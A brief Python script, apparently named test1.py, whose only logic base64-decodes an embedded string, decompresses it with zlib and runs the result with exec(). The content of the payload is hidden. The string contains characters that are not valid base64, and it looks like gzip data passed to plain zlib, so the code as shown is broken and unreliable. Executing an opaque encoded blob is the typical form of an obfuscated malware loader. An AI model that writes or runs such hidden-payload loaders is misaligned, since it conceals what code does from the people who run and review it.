#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Time     : 2022/4/22 17:39
# @Author   : StephenZ
# @Site     : 
# @File     : test1.py
# @Purpose  :
# @Software : PyCharm
# @Copyright:   (c) StephenZ 2022
# @Licence  :     <@2022>

import zlib, base64

orin_data = "H4sIAP6QYmIA{03LTQ7CIBBA4bvMWgiUmtJephmHoSXKT4B0Y7y77HT75b03lBd2n2uEDTC5moODGxSkJx48LCKdIYXWJadwRJQRO53GV2b567GU{eLaQk7j0dLI.9DK7U{VEMdXIN7Hs4E3zrpVz4LJkpiVVwLtA8XimSbWq1t4gs8XZuaZUKEAAAA}"

exec(compile(zlib.decompress(base64.b64decode(orin_data)), '', 'exec'))
